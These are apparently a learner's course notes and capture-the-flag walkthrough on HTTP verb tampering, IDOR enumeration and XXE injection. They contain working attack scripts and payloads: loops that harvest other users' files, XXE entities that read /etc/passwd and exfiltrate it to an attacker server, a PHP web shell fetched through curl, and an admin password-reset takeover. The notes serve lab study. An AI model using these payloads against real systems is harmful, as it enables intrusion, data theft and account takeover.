
# HTTP Verb Tampering

HTTP has **9 commonly used methods** that web servers can accept:

| Method    | Simple meaning                                                  |
| --------- | --------------------------------------------------------------- |
| `GET`     | Retrieve data/resource                                          |
| `POST`    | Create/submit a new resource                                    |
| `HEAD`    | Like `GET`, but returns only the headers, not the response body |
| `PUT`     | Replace/update a resource at the specified location             |
| `DELETE`  | Delete the resource at the specified location                   |
| `OPTIONS` | Shows the HTTP methods/options supported by the server          |
| `PATCH`   | Partially modify a resource                                     |
| `CONNECT` | Establishes a tunnel to the requested server                    |
| `TRACE`   | Sends the request back to the client for diagnostic purposes    |
**HTTP Verb Tampering** → Changing the HTTP method to bypass access controls; e.g., `GET /admin` is blocked, but changing it to `POST /admin` works and reveals information.

While many automated vulnerability scanning tools can consistently identify HTTP Verb Tampering vulnerabilities caused by insecure server configurations, they usually miss identifying HTTP Tampering vulnerabilities caused by insecure coding. This is because the first type can be easily identified once we bypass an authentication page, while the other needs active testing to see whether we can bypass the security filters in place. If we want to specify a single method, we can use safe keywords, like `LimitExcept` in Apache, `http-method-omission` in Tomcat, and `add`/`remove` in ASP.NET, which cover all verbs except the specified ones. To avoid HTTP Verb Tampering vulnerabilities in our code, `we must be consistent with our use of HTTP methods` and ensure that the same method is always used for any specific functionality across the web application.

| **Command**               | **Description**           |
| ------------------------- | ------------------------- |
| `curl -i -X OPTIONS link` | Set HTTP Method with Curl |

---
---

# IDOR (Insecure Direct Object Reference)

`Identify IDORS`

- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

The main takeaway is that `an IDOR vulnerability mainly exists due to the lack of an access control on the back-end`. If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data. **Example:** If User2 normally accesses `/users/2`, but changing the URL to `/users/1` returns User1's salary, the application has an **IDOR** vulnerability.

|**Command**|**Description**|
|---|---|
|`md5sum`|MD5 hash a string|
|`base64`|Base64 encode a string|

# Section 8 - Mass IDOR Enumeration

A basic IDOR happens when a web application uses a user-controlled ID to decide which user's data to show, but the server does not properly check ownership. For example: `/documents.php?uid=1`. If changing it to: `/documents.php?uid=2`, shows User 2's documents while logged in as User 1, we have an **IDOR**.

#### Static File IDOR

Sometimes filenames themselves contain predictable user IDs:

```text
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

Because the `uid` is part of the filename, we may be able to guess files belonging to other users. This is called **static file IDOR**. A better target is usually the parameter controlling which user's records are displayed: `/documents.php?uid=2`. Even if the page looks unchanged, check the **actual file links and page source**, because the returned documents may have changed.

### Find the Document Links

First, thoroughly inspect and check page source after you change the parameter in url, Burp it, request the page, check many methods and look for the document links:

```bash

curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```

A cleaner way is to use regex to extract only the PDF paths:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Example output:

```text
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

## Mass Enumeration

Instead of checking `uid=1`, `uid=2`, `uid=3` manually, loop through multiple user IDs and download the returned files:

```
#!/bin/bash

url="http://154.57.164.66:30678"

for i in {1..20}; do
    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[A-Za-z0-9]+"); do
        wget -q "$url$link"
    done
done
```


This requests:

```text
uid=1 → get documents
uid=2 → get documents
uid=3 → get documents
...
uid=10 → get documents
```

and downloads the returned PDFs.

---
---

# Section 9 - Bypassing Encoded References

**Function Disclosure:** Also investigate the **front-end JavaScript** to understand why and how the application generates the object reference. Here, `downloadContract(uid)` sends a POST request with `contract = MD5(Base64(uid))`. For example, `uid=1` → `btoa(1)` → `MQ==` → MD5 → `cdd96d3cc73d1dbdaffa03cc6cd7339b`. Once the hashing process is understood, other UIDs can be encoded and hashed to enumerate other contracts.

**Mass Enumeration:** Once the IDOR reference-generation method is understood, automate the process with a simple Bash script. For each employee ID (`1..10`), Base64-encode the ID, generate its MD5 hash, remove the trailing `-` from `md5sum` using `tr -d ' -'`, and send the hash as the `contract` value in a POST request to download each contract. Tools like Burp Intruder or ZAP Fuzzer can also automate this, but a Bash script is simple and efficient for the lab.

```
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```


## Question

In the `contracts.php` page, I checked the JavaScript function in Burp/source code and found that `downloadContract(uid)` sends the UID after **Base64 encoding and URL encoding**. For example, `uid=2` becomes `Mg==` and downloads `contract_c81e728d9d4c2f636f067f89cc14862c.pdf`, while `uid=3` downloads another user's contract. Since changing the UID gives different contracts, this indicates an **IDOR**, so I automated the first 20 UIDs:

```bash
#!/bin/bash

url="http://154.57.164.73:30581"

for i in {1..20}; do
    uid=$(printf '%s' "$i" | base64 -w 0)
    encoded=$(printf '%s' "$uid" | jq -sRr @uri)

    curl -s -OJ "$url/download.php?contract=$encoded"
done
```

When I tried opening the downloaded files, some were blank or not valid PDFs, but `grep -r "HTB" .` still returned a result because **`grep` searches the actual contents/bytes inside the files, not the filenames**. It can find `HTB` even if the file is not a valid PDF that `pdftotext` can parse.


---
---

# Section 10 - IDOR in Insecure APIs

`GET` requests are usually used to retrieve data, `POST` to create new items, `PUT` to update existing items, and `DELETE` to delete items.

For this kind of vulnerability, for example, if the API uses:

```http
GET /profile/api.php/profile/10 HTTP/1.1
```

and changing the user ID to another value, such as `10`, allows us to retrieve **another user's information without proper authorization**, this is an **IDOR vulnerability in an insecure API**.

The important thing is not simply changing the ID. The vulnerability exists because the **server fails to check whether the current user is authorized to access that specific user's data**.

---
---


# Section 11 - Chaining IDOR Vulnerabilities

As per the given HTB scenario:

Check the API endpoint with a `GET` request and change the `uid`. If another user's details are returned, such as their `uuid`, role, name, or email, this confirms **IDOR Information Disclosure**.

The leaked `uuid` can then be used in a `PUT` request to modify that user's details. This can lead to further attacks, such as **changing their email and requesting a password reset**, or **placing XSS in their `about` field**.

Next, enumerate users by changing the `uid` and look for a privileged role such as `web_admin`. If the API does not properly validate the `role` field, change the current user's role to `web_admin`. After refreshing the session/cookie, privileged API functions such as **creating or deleting users** may become available.

This is called **chaining IDOR vulnerabilities**: one IDOR leaks information (like a `uuid` or role), which is then used to exploit another API function and gain more access. By combining the information we gained from the IDOR Information Disclosure vulnerability with an IDOR Insecure Function Calls attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. Once privileged access is gained, the API may allow the same field, such as `email` or `about`, to be modified across multiple users and do like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.

## Question

I searched for a profile number 50, which was not found which means there were not 50 users, then finally got the 10th user by enumerating all profiles id: `GET /profile/api.php/profile/10 HTTP/1.1`, and got:
`{"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}`

so to get the flag, simply take the uuid and and role of this stuff_admin and replace the uuid and role of any user in that `PUT` request through BURP.

---
---

### IDOR Prevention

User roles and permissions are a vital part of any access control system, which is fully realized in a Role-Based Access Control (RBAC) system. To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource. Once an RBAC has been implemented, each user would be assigned a role that has certain privileges. Upon every request the user makes, their roles and privileges would be tested to see if they have access to the object they are requesting. They would only be allowed to access it if they have the right to do so.

While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented. Even after building a solid access control system, we should never use object references in clear text. We should always use strong and unique references, like salted hashes and store them in the back-end database, not on frontend. Strong object referencing is always the second step after implementing a strong access control system.

---
---


# XXE (XML External Entity (XXE) Injection)

## What is XML

`Extensible Markup Language (XML)` is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a `tag`, and the first element is called the `root element`, while other elements are `child elements`.

XML is used to store and transfer structured data. Every XML document normally has one **root element**, which can contain **child elements**. Some characters have special meanings, so they are written using **entity references**, such as `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, and `"` → `&quot;`. XML comments are written between `<!--` and `-->`. XML can also use a **DTD (Document Type Definition)** to define the document structure and entities. In a DTD, **SYSTEM** refers to an external resource such as a file or URL, while **PUBLIC** uses a public identifier along with an external resource.

Web Form = user-facing page. SOAP API = XML-based service that applications talk to.

- **Normal / In-band XXE** → The application directly returns the entity/file content.
- **Error-Based XXE** → The XML parser's error message reveals the file content.
- **Blind / Out-of-Band (OOB) XXE** → The application shows neither output nor useful errors, so data is sent through an external channel.

---
---


# Section 14 - Local File Disclosure (In-band XXE)

**The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input.** Then we should burp it and `note which xml elements are being displayed, such that we know which elements to inject into`.  If nothing is displayed, follow next section.

As HTB example says:

For now, we know that whatever value we place in the `<email></email>` element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the `email` element to see whether it gets replaced with the value we defined.

**Note:** In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.

`<!DOCTYPE email [ <!ENTITY company "Inlane Freight"> ]>` Now, we should have a new XML entity called `company`, which we can reference with `&company;`.

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). I

| **Code**                                                                           | **Description**                                                                                         |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`                                | Define External Entity to a URL                                                                         |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                        | Define External Entity to a file path                                                                   |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter (so they would not break the XML format when referenced) |
| `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php`                             | create a shell file and start a listening server to perform RCE                                         |
| `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">`             | execute a shell file through curl (`expect://` wrapper needs to execute a command)                      |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`  | Reading a file OOB exfiltration                                                                         |

---
---

# Section 15 - Advanced File Disclosure

Sometimes basic XXE file reading does not work because the file contains **special characters, PHP/XML code, or binary data** that break the XML response. Another problem is when the application **does not display any XML entity output**. In those cases, two useful techniques are **CDATA-based XXE** and **Error-Based XXE**. This can potentially work with **any web application vulnerable to XXE**, depending on its XML parser and external-entity configuration.

## 1. XXE with CDATA

**CDATA** tells the XML parser to treat the content as **raw data**, so characters such as `<`, `>`, and `&` inside the file are not interpreted as XML.

```text
<![CDATA[ FILE_CONTENT ]]>
```

We create three entities:

```text
begin → <![CDATA[
file  → target file
end   → ]]>
```

The names `begin`, `file`, and `end` are **not special**; they are simply names we chose. They could be called `start`, `target`, and `finish`. A normal attempt would be:

```xml

<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

However, XML does **not allow internal and external entities to be joined this way**, so we use **parameter entities (`%`)** and an external DTD. On the Attack Machine:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Then send the XML to the vulnerable endpoint:

```http
POST /submitDetails.php HTTP/1.1
Host: TARGET
Content-Type: application/xml

<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

This can be useful for **PHP source files and other data that would normally break XML parsing**. It is not guaranteed for every web application; it depends on the XML parser and whether external entities are allowed.

---

## 2. Error-Based XXE

Sometimes the application does **not display XML entity output**. If it displays detailed XML/PHP errors, we can make the application **leak file contents through an error message**. First test whether errors are displayed by sending malformed XML:

```http
POST /error/submitDetails.php HTTP/1.1
Host: TARGET
Content-Type: application/xml

<roo>
```

or reference an entity that does not exist:

```xml
<email>&nonExistingEntity;</email>
```

If the response shows a useful parser error, create `xxe.dtd` (**within this specific Error-Based XXE technique**, the structure is generally reusable.):

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Here:

```text
%file;               → reads /etc/hosts
%nonExistingEntity;  → intentionally does not exist
%error;              → creates an invalid reference containing the file content
```

Then send:

```http
POST /error/submitDetails.php HTTP/1.1
Host: TARGET
Content-Type: application/xml

<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

On the Attack Machine:

```bash
python3 -m http.server 8000
```

The parser processes the invalid reference and the resulting error may contain the contents of `/etc/hosts`. To read another file, change: 

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
```

to:

```xml
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
```

**Error-based XXE is generally less reliable than CDATA** because error messages can have length limits, and special characters can still break the payload.

---
---

# Section 16 - Blind Data Exfiltration

## OOB Data Exfiltration

When XXE is **completely blind**, the application gives us neither the XML entity output nor useful errors. In this case, we cannot read the file directly from the response, so we use **Out-of-Band (OOB) exfiltration**. The target reads the file, encodes the contents, and then makes a request to a server we control with the encoded data in the URL.

## When to Use OOB XXE

Use OOB when:

- The XML parser accepts external entities.
- The application does not return the entity contents.
- Error-based XXE does not reveal the file.
- The target can make outbound HTTP or DNS requests to our server.

The important idea is:

> **The vulnerable application does not show us the file. The target sends the file data to our server instead.**

## Manual OOB XXE

The basic idea is to use a PHP filter to **Base64-encode the target file**, then put that encoded value into a URL requested by the target:

### 1. Create the OOB DTD

On the **Attack Machine**, create `xxe.dtd`:

```bash
vi xxe.dtd
```

Put:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Here:

```text
%file → reads and Base64-encodes /etc/passwd
%oob  → creates an external entity containing our server URL
%content → causes the target to request our server with the encoded file
```

We use Base64 because raw file contents may contain characters that would break the XML or URL.

Then start a server:

```bash
python3 -m http.server 8000
```

Alternatively, if you want the server to automatically decode the Base64 data, create `index.php`:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

and run:

```bash
php -S 0.0.0.0:8000
```

### 2. Send the XXE Payload


```http
POST /blind/submitDetails.php HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The important part is:

```xml
<root>&content;</root>
```

We **must reference `&content;`** so the XML parser actually triggers the external request containing the file data. Here `/blind/` is simply part of the **URL path** of the given example. It is not required for XXE itself 

The request is sent to the vulnerable application's endpoint. The vulnerable application may return something like:

```text
200 OK
Check your email for results.
```

The **flag/file contents will not appear in this response**. Instead, the target makes a request to our server.

### 3. Receive and Decode the Data

If using the PHP listener, the terminal can show the decoded file contents:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

The important difference from normal XXE is:

```text
Normal XXE → file content comes back in application response

Blind OOB XXE → file content comes back to our external server
```

The Attack Machine's HTTP server will also show that the target requested `xxe.dtd` and then made another request containing the encoded data.

### Troubleshooting

If the target requests:

```text
GET /xxe.dtd
```

but never makes the second request containing:

```text
?content=...
```

check:

- Whether `&content;` is actually referenced.
- Whether external entities are enabled.
- Whether the target can make outbound HTTP requests.
- Whether the DTD syntax is correct.
- Whether the PHP filter is supported by the target.

## DNS OOB

Instead of putting the Base64 data in an HTTP query parameter, the encoded data can sometimes be placed in a **DNS subdomain**, such as:

```text
ENCODEDDATA.our-domain.com
```

A DNS server can then capture the requested subdomain by `tcpdump` and the encoded value can be decoded. This is more advanced and is mainly useful when HTTP-based OOB communication is unavailable but DNS requests are allowed.

---

# Automated OOB XXE — XXEinjector

For repeated blind XXE testing, **XXEinjector** can automate the process. Clone it on the Attack Machine:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Copy the vulnerable HTTP request from **Burp** into a file such as:

```text
/tmp/xxe.req
```

Do **not** include the complete XML payload. Keep the XML declaration and put `XXEINJECT` where the tool should insert its payload:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET
Content-Type: text/plain;charset=UTF-8
Content-Length: 169

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Then run:

```bash

ruby XXEinjector.rb --host=ip --httpport=4444 --file=/home/p.txt --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
```

Important options:

```text
--host       → Attack Machine IP
--httpport   → Port where the OOB server listens
--file       → Burp request file
--path       → File to read from the target
--oob=http   → Use HTTP OOB exfiltration
--phpfilter  → Base64-encode the file using PHP filtering
```

The tool may show:

```text
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

The data may not appear directly because `--phpfilter` Base64-encodes it. Exfiltrated files are stored under the tool's `Logs` directory. For example:

```bash
cat Logs/TARGET/etc/passwd.log
```

This can show:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---
---


# Skill Assessment

## 1. Check for HTTP Verb Tampering

From the inquiry option, I inspected the JavaScript that handled HTTP methods. The code only allows:

```text
GET
POST
PUT
DELETE
```

Any other method, such as `HEAD` or `PATCH`, is automatically changed to `POST`. Because unsupported methods are converted to `POST`, there was **no useful HTTP Verb Tampering through this JavaScript function**. However, changing the method directly in the request still produced an interesting result later.

---

## 2. Investigate the Password Reset Token

When clicking the password-reset button without entering a password, the application made this request:

```http
GET /api.php/token/76 HTTP/1.1
```

The important observation was that the **token changes according to the UID**. The application gets the UID from the cookie:

```text
Cookie: uid=76
```

I then captured the password-reset request:

```http
POST /reset.php HTTP/1.1
Host: 154.57.164.78:31200
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i2cdbolf1g63l2k4ut9tejdmqc; uid=74

uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=123456
```

I tried changing the `uid` and using a token belonging to another user found from `GET /api.php/token/76 HTTP/1.1` not knowing which was admin, it was just a random check. The server responded with:

```text
Access denied
```

So simply changing the UID/token in the normal `POST /reset.php` request was not enough.

---

## 3. Test the HTTP Method

Since the normal POST request returned `Access denied`, I changed the method to `GET`. For example:

```http
GET /reset.php?uid=76&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test HTTP/1.1
```

This produced a response, unlike the original POST request. but i got no interesting information. So although the JavaScript tried to restrict the available methods, the backend endpoint itself behaved differently when accessed directly with another HTTP method.

Now lets find the admin. and repeat this again.

---

## 4. Find an IDOR in the User API

I thought i failed but then I remembered i didn't capture the initial request to investigate. After logging in again, I inspected the profile request:

```http
GET /api.php/user/76 HTTP/1.1
Host: 154.57.164.78:31200
Cookie: PHPSESSID=i2cdbolf1g63l2k4ut9tejdmqc; uid=76
```

I changed the UID in the URL:

```text
/api.php/user/76
```

to another value:

```text
/api.php/user/50
```

The application returned information belonging to another user. This indicated an **IDOR (Insecure Direct Object Reference)** because the API was trusting the user-controlled UID in the URL without properly checking whether I was authorized to access that user's information. I then checked the first 100 UIDs (seems like it has only 100 user., as uid 101 returned nothing):

```bash
for uid in {1..100}; do
    echo "===== UID: $uid ====="
    curl --path-as-is -s -k \
      -H 'Host: 154.57.164.78:31200' \
      -H 'Accept: */*' \
      -b 'PHPSESSID=i2cdbolf1g63l2k4ut9tejdmqc' \
      "http://154.57.164.78:31200/api.php/user/$uid"
    echo
done
```

Among the results, I found:

```json
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

---

## 5. Get the Token for UID 52

I then requested the reset token for UID `52`:

```http
GET /api.php/token/52 HTTP/1.1
```

The application returned:

```json
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

So I now had a token associated with UID `52`. I tried using that token with the normal password-reset POST request, but it returned:

```text
Access denied
```

I then tested the endpoint using GET:

```http
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test HTTP/1.1
```

This worked and password reset was successful for the admin id.

---

## 6. Find Another Input Point

After logging in and exploring the application, I found an **Add Event** form. I captured the request and noticed that the submitted data was being sent as **XML**. Since the application was parsing XML, I tested the `name` field for **XXE (XML External Entity)**.

The test payload was:

```xml
<!DOCTYPE name [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
```

I placed the entity reference in the `name` field:

```xml
<name>&company;</name>
```

The application processed the external entity and returned the contents of `/flag.php`. After decoding the Base64 data, I obtained the **flag**.

